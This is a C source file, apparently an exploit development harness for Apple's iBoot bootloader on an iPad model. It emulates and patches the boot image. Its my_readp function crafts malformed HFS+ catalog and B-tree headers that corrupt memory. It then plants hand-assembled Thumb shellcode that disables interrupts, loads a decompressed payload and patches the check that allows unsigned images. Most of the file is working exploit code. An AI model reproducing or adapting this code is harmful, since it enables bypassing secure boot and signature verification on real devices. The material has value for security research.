#define IMAGE_NAME              "pwned21.bin"
#define IMAGE_START             0x9FF00000
#define IMAGE_END               0x9FF4CCB4
#define IMAGE_SIZE              (IMAGE_END - IMAGE_START)
#define IMAGE_HEAP_SIZE         ((IMAGE_START + 0xF7000) - IMAGE_END)
#define IMAGE_BSS_START         0x9FF46E40
#define IMAGE_TEXT_END          0x9FF46000 /* XXX this is a lie */
#define IMAGE_STACK_SIZE        0x1000
#define IMAGE_LOADADDR          0x80000000
#define IMAGE_HUGECHUNK         0x3000000


#define breakpoint1_ADDR        (0x18D44 + 1) /* ResolvePathToCatalogEntry */

#define fuck1_ADDR              (0x19BA6 + 1)
#define fuck2_ADDR              (0x19BBC + 1)
#define fuck3_ADDR              (0x19CD2 + 1)

#define wait_for_event_ADDR     (0x00814)
#define hugechunk_ADDR          (0x00CAE + 1)
#define gpio_pin_state_ADDR     (0x02C2C + 1)
#define gpio_set_state_ADDR     (0x02C4C + 1)
#define get_timer_us_ADDR       (0x01818 + 1)
#define reset_cpu_ADDR          (0x0186C + 1)
#define readp_ADDR              (0x1996C + 1)
#define get_mem_size_ADDR       (0x1F48C + 1)
#define putchar_ADDR            (0x35FD8 + 1)
#define adjust_stack_ADDR       (0x1EBC8 + 1)
#define adjust_environ_ADDR     (0x1F0C4 + 1)
#define disable_interrupts_ADDR (0x36D14 + 1)
#define cache_stuff_ADDR        (0x21E18 + 1)
#define wtf_ADDR                (0x01748 + 1)

#define iboot_warmup_ADDR       (0x00110)
#define iboot_start_ADDR        (0x00BD0 + 1)
#define main_task_ADDR          (0x00C3C + 1)
#define panic_ADDR              (0x20534 + 1)
#define system_init_ADDR        (0x20620 + 1)
#define task_create_ADDR        (0x20C50 + 1)
#define task_start_ADDR         (0x20DB0 + 1)
#define task_exit_ADDR          (0x20DD4 + 1)
#define printf_ADDR             (0x35840 + 1)
#define malloc_ADDR             (0x19988 + 1)
#define free_ADDR               (0x19A3C + 1)
#define create_envvar_ADDR      (0x182AC + 1)
#define bcopy_ADDR              (0x362C4)
#define decompress_lzss_ADDR    (0x24FF0 + 1)


void NAKED
my_breakpoint1(void)
{
#ifdef __arm__
    __asm volatile (
        /* debug */
        BCALL(my_breakpoint1_helper)
        /* replacement insn */
        "ldrb r4, [r11];"
        /* return */
        "bx lr;"
    );
#endif /* __arm__ */
}


#ifdef __arm__
void
real_fuck1(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x4A3C0 + 0x28 + 32 * 4) {
        unsigned int t2 = (uintptr_t)image + 0x4A3C0 + 0x28 + r3 * 4;
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x, r3 = 0x%x, r2 => 0x%x (0x%x)\n", sp, r8, r3, t2, sp - t2);
        dumpfile("DUMP_z1");
    }
    (void)(r0 && r1 && r2);
}

void
real_fuck2(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r9 __asm("r9");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x4A3C0 + 0x28 + 32 * 4) {
#define ULAT(x) (((x) & 0xFFFFF) + IMAGE_START)
        unsigned int t4 = r2 - 0x20;
        unsigned int t1 = r0 + (r1 << 5);
        unsigned int u4 = ULAT(r2) - 0x20;
        unsigned int u1 = ULAT(r0) + (r1 << 5);
#undef ULAT
        fprintf(stderr, "_memalign: sp = 0x%x, r0 = 0x%x, r1 = 0x%x (0x%x/0x%x), r2 = 0x%x, r3 = 0x%x, r4 => (0x%x/0x%x), r9 = 0x%x (0x%x)\n", sp, r0, r1, t1, u1, r2, r3, t4, u4, r9, t1 - t4);
        dumpfile("DUMP_z2");
    }
}

void
real_fuck3(unsigned int r0, unsigned int r1, unsigned int r2, unsigned int r3)
{
    register unsigned int r8 __asm("r8");
    register unsigned int sp __asm("r11");
    if (sp <= (uintptr_t)image + 0x4A3C0 + 0x28 + 32 * 4) {
        fprintf(stderr, "_memalign: sp = 0x%x, r8 = 0x%x\n", sp, r8);
        dumpfile("DUMP_z3");
#if 1
        eprintf("Printing memory...\n");
        eprintf("*** MEMORY ***\n");
        unsigned int i = 0x4A308;
        for (; i < 0x4A308 + 0x20 * 4; i += 0x10) {
            eprintf("[%x] ", (uintptr_t)image + i);
            unsigned int c = i;
            for (; c - i < 0x10; c += 4) {
                eprintf("%02x", ((unsigned char*)image)[c + 0x0]);
                eprintf("%02x", ((unsigned char*)image)[c + 0x1]);
                eprintf("%02x", ((unsigned char*)image)[c + 0x2]);
                eprintf("%02x ", ((unsigned char*)image)[c + 0x3]);
            }
            eprintf("\n");
        }
#endif
    }
    (void)(r0 && r1 && r2 && r3);
}
#endif /* __arm__ */


void NAKED
fuck1(void)
{
#ifdef __arm__
    /* can use: r6, r10, r11 (r0, r1, r2) */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "push   {r0-r12};"
        "blx    _real_fuck1;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "add    r6, r4, #0x1f;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck2(void)
{
#ifdef __arm__
    /* can use: r4, r10, r11 */
    __asm volatile (
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r4, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r4;"
        "push   {r0-r12};"
        "blx    _real_fuck2;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "sub    r4, r2, #0x20;"
        "bx     r10;"
    );
#endif /* __arm__ */
}

void NAKED
fuck3(void)
{
#ifdef __arm__
    /* can use: r10, r11 (r2, r3, r5, r6) */
    __asm volatile (
        "str    r0, [r8];"
        "mov    r10, lr;"
        "mov    r11, sp;"
        "mov    r6, r0;"
        "blx    _getstak;"              /* XXX hope it only destroys r0 */
        "mov    sp, r0;"
        "mov    r0, r6;"
        "push   {r0-r12};"
        "blx    _real_fuck3;"
        "pop    {r0-r12};"
        "mov    sp, r11;"
        "bx     r10;"
    );
#endif /* __arm__ */
}


void
my_adjust_stack(void)
{
    /*
    [NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE0
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE1
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE2
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE3
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE8
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE9
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE10
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE11


=======================================
::
:: iBoot for k93ap, Copyright 2013, Apple Inc.
::
::    BUILD_TAG: 9ff4ef40
::
::    BUILD_STYLE: 9ff50cd4
::
::    USB_SERIAL_NUMBER: CPID:8940 CPRV:21 CPFM:03 SCEP:11 BDID:04 ECID:0000000FA90ECD4D IBFL:1B SRNM:[]
::
=======================================

[FTL:MSG] Apple NAND Driver (AND) RO
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE0
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE1
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE2
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI0:CE3
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE8
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE9
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE10
[NAND] h2fmiPrintConfig:544 Chip ID EC D7 94 7A 54 43 on FMI1:CE11
[FTL:MSG] FIL_Init            [OK]
[FTL:MSG] BUF_Init            [OK]
[FTL:MSG] FPart Init          [OK]
read new style signature 0x43313140 (line:389)
[FTL:MSG] VSVFL Register  [OK]
[WMR:MSG] Metadata whitening is set in NAND signature
[FTL:MSG] VFL Init            [OK]
[FTL:MSG] VFL_Open            [OK]
[FTL:MSG] YAFTL Register  [OK]
[FTL:MSG] FTL_Open            [OK]
Boot Failure Count: 0    Panic Fail Count: 0
Delaying boot for 0 seconds. Hit enter to break into the command prompt...
HFSInitPartition: 0x9ff57e80
Entering recovery mode, starting command prompt
    */
#if 0
    CALL(malloc)(1856 - 32);
#elif 0
    int i;
    for (i = 0; i < 29; i++) {
        CALL(malloc)(32);
    }
#else
    void* ptr;
    ptr = CALL(malloc)(1856 - 32);
    CALL(free)(ptr);
    CALL(malloc)(928 - 32);
    CALL(malloc)(928 - 32);
#endif
}


void
my_adjust_environ(void)
{
#if 1
    CALL(create_envvar)("boot-ramdisk", "/a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/disk.dmg", 0);
#endif
}


void
suck_sid(void)
{
    fprintf(stderr, "suck sid\n");
    dumpfile("DUMP2");
}


int
my_readp(void *ih, void *buffer, long long offset, int length)
{
#define TREEDEPTH 1
#define TRYFIRST 0
#define TRYLAST 0
    long long off;
    eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
#if TRYLAST
    if (buffer == (void *)IMAGE_LOADADDR) {
        return length;
    }
#endif
    off = lseek(rfd, offset, SEEK_SET);
    assert(off == offset);
    length = read(rfd, buffer, length);
#if TREEDEPTH || TRYFIRST || TRYLAST
#define NODE_SIZE (0x2000)
#define TOTAL_NODES (0xFFF)
#define ROOT_NODE (0xFFFFFF / NODE_SIZE - 1)
#define EXTENT_SIZE ((unsigned long long)NODE_SIZE * (unsigned long long)TOTAL_NODES)
if (1) {
    /* XXX stack recursion eats 208 bytes, watch out for 0x57EA0 + 0x18 = 0x57EB8 */
    static int seq = 0;
    switch (seq) {
        case 0:
            PUT_QWORD_BE(buffer, 0x110, 512ULL * 0x7FFFFFULL);  /* HFSPlusVolumeHeader::catalogFile.logicalSize */
            PUT_QWORD_BE(buffer,  0xc0, EXTENT_SIZE);           /* HFSPlusVolumeHeader::extentsFile.logicalSize */
            break;
        case 1:
            memset(buffer, 'E', length);
#if TREEDEPTH
            PUT_WORD_BE(buffer, 14, 3);                         /* BTHeaderRec::treeDepth */
#elif TRYLAST
            PUT_WORD_BE(buffer, 14, 2);                         /* BTHeaderRec::treeDepth */
#endif
            PUT_WORD_BE(buffer, 32, 512);                       /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, 0x7FFFFF);                 /* BTHeaderRec::totalNodes */
#if TRYFIRST
            PUT_DWORD_BE(buffer, 16, (0xFFFFFF / 512 - 1));     /* BTHeaderRec::rootNode (trigger) */
#else
            PUT_DWORD_BE(buffer, 16, 3);                        /* BTHeaderRec::rootNode */
#endif
            memcpy((char *)buffer + 40, nettoyeur, (nettoyeur_sz < 216) ? nettoyeur_sz : 216);
            break;
        case 2:
            memset(buffer, 'F', length);
            if (nettoyeur_sz > 216) memcpy(buffer, nettoyeur + 216, nettoyeur_sz - 216);
            PUT_WORD_BE(buffer, 32, NODE_SIZE);                 /* BTHeaderRec::nodeSize */
            PUT_DWORD_BE(buffer, 36, TOTAL_NODES);              /* BTHeaderRec::totalNodes */
            PUT_DWORD_BE(buffer, 16, 0x500);                    /* BTHeaderRec::rootNode (must be big, but LSB must be zero) */
            PUT_WORD_LE(buffer, 20, 0);                         /* must be zero (see above) */
            PUT_WORD_LE(buffer, 14, 0);                         /* must be zero, to allow r3 to grow */
            PUT_DWORD_LE(buffer, 46, (uintptr_t)image + 0x4A2E0);                       /* *r2 = r4 */
            PUT_DWORD_LE(buffer, 0x4A2E0 + 4 - 0x4A2B4 + 2 , 0x1);                        /* *(r0 + 4) > r9, 16 for iloader */
            PUT_DWORD_LE(buffer, 0x4A2E0 + 0x20 - 0x4A2B4, (uintptr_t)image + 0x4A308 + 1); /* r10 (code exec) */
            PUT_DWORD_LE(buffer, 0x4A2E0 + 0x24 - 0x4A2B4, (uintptr_t)image + 0x4A424); /* r11 -> lr */
#if 0
            PUT_WORD_LE(buffer, 0x4A308 + 0 - 0x4A2B4, INSNT_ILLEGAL);
#elif 1
            PUT_DWORD_LE(buffer, 0x4A308 +   0 - 0x4A2B4, INSNW_LDR_SP_PC80);
            PUT_DWORD_LE(buffer, 0x4A308 +   4 - 0x4A2B4, make_bl(0, 0x4A308 +  4, disable_interrupts_ADDR - 1));
            PUT_WORD_LE(buffer,  0x4A308 +   8 - 0x4A2B4, INSNT_LDR_R_PC(4, 76));
            PUT_WORD_LE(buffer,  0x4A308 +  10 - 0x4A2B4, INSNT_LDR_R_PC(0, 80));
            PUT_WORD_LE(buffer,  0x4A308 +  12 - 0x4A2B4, INSNT_MOV_R_R(1, 4));
            PUT_WORD_LE(buffer,  0x4A308 +  14 - 0x4A2B4, INSNT_LDR_R_PC(2, 80));
            PUT_DWORD_LE(buffer, 0x4A308 +  16 - 0x4A2B4, make_bl(1, 0x4A308 + 16, bcopy_ADDR));
            PUT_DWORD_LE(buffer, 0x4A308 +  20 - 0x4A2B4, INSNW_MOV_R1_2400);
            PUT_DWORD_LE(buffer, 0x4A308 +  24 - 0x4A2B4, INSNW_STRH_R1_R4_E2C);
            PUT_WORD_LE(buffer,  0x4A308 +  28 - 0x4A2B4, INSNT_LDR_R_PC(0, 68));
            PUT_DWORD_LE(buffer, 0x4A308 +  30 - 0x4A2B4, INSNW_MOV_R1_80000000);
            PUT_WORD_LE(buffer,  0x4A308 +  34 - 0x4A2B4, INSNT_B_PC4);
            PUT_WORD_LE(buffer,  0x4A308 +  42 - 0x4A2B4, INSNT_STR_R1_R4_R0);
            PUT_WORD_LE(buffer,  0x4A308 +  44 - 0x4A2B4, INSNT_LDR_R_PC(0, 56));
            PUT_WORD_LE(buffer,  0x4A308 +  46 - 0x4A2B4, INSNT_LDR_R_PC(1, 60));
            PUT_WORD_LE(buffer,  0x4A308 +  48 - 0x4A2B4, INSNT_STR_R1_R4_R0);
            PUT_DWORD_LE(buffer, 0x4A308 +  50 - 0x4A2B4, make_bl(0, 0x4A308 + 50, 0x20C44));
            PUT_WORD_LE(buffer,  0x4A308 +  54 - 0x4A2B4, INSNT_MOV_R_I(1, 0));
            PUT_WORD_LE(buffer,  0x4A308 +  56 - 0x4A2B4, INSNT_STR_R1_R0_68);
            PUT_WORD_LE(buffer,  0x4A308 +  58 - 0x4A2B4, INSNT_LDR_R_PC(0, 52));
            PUT_WORD_LE(buffer,  0x4A308 +  60 - 0x4A2B4, INSNT_MOV_R_I(1, 0xEC));
            PUT_WORD_LE(buffer,  0x4A308 +  62 - 0x4A2B4, INSNT_LDR_R_PC(2, 52));
            PUT_WORD_LE(buffer,  0x4A308 +  64 - 0x4A2B4, INSNT_MOV_R_I(3, nettoyeur_sz));
            PUT_WORD_LE(buffer,  0x4A308 +  66 - 0x4A2B4, INSNT_MOV_R_R(5, 0));
            PUT_DWORD_LE(buffer, 0x4A308 +  68 - 0x4A2B4, make_bl(0, 0x4A308 + 68, decompress_lzss_ADDR - 1));
            PUT_WORD_LE(buffer,  0x4A308 +  72 - 0x4A2B4, INSNT_LDR_R_PC(0, 44));
            PUT_WORD_LE(buffer,  0x4A308 +  74 - 0x4A2B4, INSNT_BLX_R(0));
            PUT_DWORD_LE(buffer, 0x4A308 +  76 - 0x4A2B4, make_bl(0, 0x4A308 + 76, cache_stuff_ADDR - 1));
            PUT_WORD_LE(buffer,  0x4A308 +  80 - 0x4A2B4, INSNT_BLX_R(5));
            PUT_WORD_LE(buffer,  0x4A308 +  82 - 0x4A2B4, INSNT_BX_R(4));
            PUT_DWORD_LE(buffer, 0x4A308 +  84 - 0x4A2B4, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
            PUT_DWORD_LE(buffer, 0x4A308 +  88 - 0x4A2B4, (uintptr_t)image /* 0x84000000 */);
            PUT_DWORD_LE(buffer, 0x4A308 +  92 - 0x4A2B4, (uintptr_t)image /* 0x9FF00000 */);
            PUT_DWORD_LE(buffer, 0x4A308 +  96 - 0x4A2B4, IMAGE_BSS_START - IMAGE_START);
            PUT_DWORD_LE(buffer, 0x4A308 + 100 - 0x4A2B4, 0x43B48 /* go command handler */);
            PUT_DWORD_LE(buffer, 0x4A308 + 104 - 0x4A2B4, 0x1A5E4 /* allow unsigned images */);
            PUT_DWORD_LE(buffer, 0x4A308 + 108 - 0x4A2B4, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
            PUT_DWORD_LE(buffer, 0x4A308 + 112 - 0x4A2B4, (uintptr_t)image + 0x4B000 /* nettoyeur uncompressed */);
            PUT_DWORD_LE(buffer, 0x4A308 + 116 - 0x4A2B4, (uintptr_t)image + 0x4A1DC /* nettoyeur compressed */);
            PUT_DWORD_LE(buffer, 0x4A308 + 120 - 0x4A2B4, (uintptr_t)suck_sid /* IMAGE_START + wtf_ADDR */);
#endif
            break;
#if TREEDEPTH
        default: {
            static long long oldpos = 0;
            if ((seq % 3) == 0) {
                ((unsigned char *)buffer)[9]++;                                         /* BTNodeDescriptor::height */
                ((unsigned char *)buffer)[8] = -(((unsigned char *)buffer)[9] == 1);    /* BTNodeDescriptor::kind */
                oldpos = offset;
            } else if (oldpos) {
                lseek(rfd, oldpos, SEEK_SET);
                read(rfd, buffer, length);
                oldpos = 0;
#if 0
                if (seq == 1 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 32, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 2 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 3 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 44, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 4 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 5 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 56, 0x10000);
                    break;
                }
#elif 0 /*?*/
                if (seq == 6 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0 /*?*/
                if (seq == 7 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 68, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 8 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 9 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 80, 0x10000);
                    break;
                }
#elif 0
                if (seq == 10 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 11 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 92, 0x10000);
                    break;
                }
#elif 0 /*?*/
                if (seq == 12 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 104, 0x10000);
                    break;
                }
#elif 0 /*?*/
                if (seq == 13 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 104, 0x10000);
                    break;
                }
#elif 0 /* wfe */
                if (seq == 14 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 116, 0x10000);
                    break;
                }
#elif 1 /*^_^*/
                if (seq == 15 * 3 + 1) {
                    PUT_DWORD_BE(buffer, 128, 0x10000);
                    break;
                }
#endif            
	    }
        }
#endif /* TREEDEPTH */
    }
#if TRYLAST
    if (seq == 2 + (19 * 2) * (2 + TREEDEPTH)) {
        PUT_DWORD_BE(buffer, 0xa6, 1);
    }
#endif /* TRYLAST */
if (seq < 3) {
    int ofd;
    char tmp[256];
    sprintf(tmp, "BLOCK_%llx_%d", offset, seq);
    ofd = creat(tmp, 0644);
    if (ofd >= 0) {
        write(ofd, buffer, length);
        close(ofd);
    }
}
    seq++;
}
#endif
    return length;
}


void
check_irq_count(void)
{
    eprintf("irq_disable_count = 0x%x\n", *(unsigned int *)(image + 0x4EF40 + 0x18));
}


void
my_cache_stuff(void)
{
#ifdef __APPLE__
    sys_icache_invalidate(image, IMAGE_SIZE + IMAGE_HEAP_SIZE);
#endif
}


#if USE_SIGNAL
#ifdef __arm__
int
dispatch_SEGV(void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
    struct mmreg {
        unsigned long mmaddr;
        unsigned int pc;
        int reg;
        int val;
        int next;
    };

    static const struct mmreg mmregs[] = {
        /* end-of-table */
        { 0xFFFFFFFF, 0x00000, 0, 0, 0 },
    };

    const struct mmreg *m;

    if (si_addr == 0) {
        if (tctx->__pc == (uintptr_t)(image + 0x20A62)) {
            /* idle task crap (read from *0) */
            tctx->__r[0] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
        if (tctx->__pc == (uintptr_t)(image + 0x20CC2)) {
            tctx->__r[1] = *(uint32_t *)(image);
            tctx->__pc += 2;
            return 0;
        }
    }

    for (m = mmregs; m->mmaddr != 0xFFFFFFFF; m++) {
        if (si_addr == (void *)m->mmaddr && tctx->__pc == (uintptr_t)(image + m->pc)) {
            int reg = m->reg;
            int val = m->val;
            if (reg >= 0) {
                tctx->__r[reg] = val;
            }
            tctx->__pc += m->next;
            return 0;
        }
    }

    return -1;
}

int
dispatch(int signum, void *si_addr, _STRUCT_ARM_THREAD_STATE *tctx)
{
#if USE_SIGNAL > 1
    if (signum == ILLNO) {
        if ((tctx->__cpsr & 0x20) == 0 && *(uint32_t *)si_addr == INSNA_ILLEGAL) {
            /* ARM handlers: tctx->__pc += 4; */
            uintptr_t addr = (unsigned char *)si_addr - image;
            switch (addr) {
                case wait_for_event_ADDR:
                    my_wait_for_event();
            }
        } else if ((tctx->__cpsr & 0x20) != 0 && *(uint16_t *)si_addr == INSNT_ILLEGAL) {
            /* Thumb handlers: tctx->__pc += 2; */
            uintptr_t addr = (unsigned char *)si_addr - image + 1;
            switch (addr) {
                case cache_stuff_ADDR:
                    my_cache_stuff();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case hugechunk_ADDR:
                    tctx->__r[0] = (uint32_t)gethuge();
                    tctx->__pc += 4;
                    return 0;
                case gpio_pin_state_ADDR:
                    tctx->__r[0] = my_gpio_pin_state(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case gpio_set_state_ADDR:
                    my_gpio_set_state(tctx->__r[0], tctx->__r[1]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_timer_us_ADDR:
                    *(uint64_t *)(&tctx->__r[0]) = my_get_timer_us();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case reset_cpu_ADDR:
                    my_reset_cpu();
                case readp_ADDR:
                    tctx->__r[0] = my_readp((void *)tctx->__r[0], (void *)tctx->__r[1], *(uint64_t *)(&tctx->__r[2]), *(uint32_t *)tctx->__sp);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case get_mem_size_ADDR:
                    tctx->__r[0] = my_get_mem_size();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case putchar_ADDR:
                    putchar(tctx->__r[0]);
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_stack_ADDR:
                    my_adjust_stack();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case adjust_environ_ADDR:
                    my_adjust_environ();
                    tctx->__pc = tctx->__lr;
                    return 0;
                case breakpoint1_ADDR:
                    my_breakpoint1_helper(tctx->__r[0], tctx->__r[1], tctx->__r[2], tctx->__r[3], tctx->__sp, tctx->__lr);
                    tctx->__r[4] = *(unsigned char *)tctx->__r[11];
                    tctx->__pc += 4;
                    return 0;
            }
        }
    }
#endif /* USE_SIGNAL > 1 */
    if (signum == SIGSEGV) {
        return dispatch_SEGV(si_addr, tctx);
    }
    return -1;
}
#endif /* __arm__ */
#endif /* USE_SIGNAL */


void
patch_image(unsigned char *image)
{
    /* jump directly to warmup */
    *image = (iboot_warmup_ADDR - 8) / 4;
    /* heap hardcoded offset */
    *(uint32_t *)(image + 0x2062C) = INSN2_LDR_R1_PC__B_PLUS4;
    *(void **)(image + 0x20630) = XLAT(IMAGE_END + IMAGE_HEAP_SIZE);
    /* clean data cache */
    *(uint32_t *)(image + 0x21A1C) = INSNA_RETURN;
#if !USE_SIGNAL
    /* idle task crap (read from *0) */
    *(uint16_t *)(image + 0x20A62) = INSNT_NOP;
    *(uint16_t *)(image + 0x20CC2) = INSNT_MOV_R_R(1, 0);
#endif /* !USE_SIGNAL */
    /* timer 2 */
    *(uint32_t *)(image + 0x1FDD8) = INSN2_RETURN_0;
    /* task switch FPU */
    *(uint32_t *)(image + 0x21E4C) = INSNA_MOV_R2_0;
    *(uint32_t *)(image + 0x21E7C) = INSNA_MOV_R2_0;
    /* bzero during mmu_init */
    *(uint32_t *)(image + 0x211FC) = INSN2_NOP__NOP;
    /* nop some calls during iboot_start */
    *(uint32_t *)(image + 0x00BD6) = INSN2_NOP__NOP;
#if 0 /* adjust_stack */
    *(uint32_t *)(image + 0x00BDE) = INSN2_NOP__NOP;
#endif

    /* nop spi stuff */
#if 0 /* adjust_environ */
    *(uint32_t *)(image + 0xCBA) = INSN2_NOP__NOP;
#endif
    /* FPEXC triggered by nvram_save() */
    *(uint32_t *)(image + 0x498) = INSNA_NOP;
    *(uint32_t *)(image + 0x490) = INSNA_NOP;

    /* pretend we have nand device? */
    *(uint32_t *)(image + 0xA70) = INSN2_MOV_R0_1__MOV_R0_1;
    *(uint32_t *)(image + 0x195A2) = INSN2_MOV_R0_1__MOV_R0_1;

    /* make main_task show SP */
    *(uint16_t *)(image + 0xD94) = INSNT_MOV_R_R(1, 13);
    *(uint8_t *)(image + 0x370E4) = 'x';
    /* show task structure */
    *(void **)(image + 0xFA4) = image + 0x464E0;
    *(uint8_t *)(image + 0x370D0) = 'x';

    /* nop NAND */
    *(uint32_t *)(image + 0x1EEEC) = INSN2_NOP__NOP;

    /* nop some more hw */
    *(uint32_t *)(image + 0x0BB48) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x01770) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x026D8) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x00D60) = INSN2_NOP__NOP;
    *(uint16_t *)(image + 0x0C17C) = INSNT_NOP; /* XXX loop */
    *(uint16_t *)(image + 0x1FF92) = INSNT_NOP;
    *(uint32_t *)(image + 0x1F2F4) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F4FC) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F51C) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F55C) = INSN2_RETURN_0;
    *(uint32_t *)(image + 0x1F574) = INSN2_RETURN_21;
    *(uint32_t *)(image + 0x1F58C) = INSN2_RETURN_0;
}


void
patch_nettoyeur(unsigned char *nettoyeur)
{
    *(void **)(nettoyeur + 0xD8) = image + *(uint32_t *)(nettoyeur + 0xD8) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xDC) = image + *(uint32_t *)(nettoyeur + 0xDC) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xE0) = image + *(uint32_t *)(nettoyeur + 0xE0) - (IMAGE_LOADADDR + 0x4000000);
    *(void **)(nettoyeur + 0xE4) = XLAT(*(uint32_t *)(nettoyeur + 0xE4));
    *(void **)(nettoyeur + 0xE8) = XLAT(*(uint32_t *)(nettoyeur + 0xE8));
}
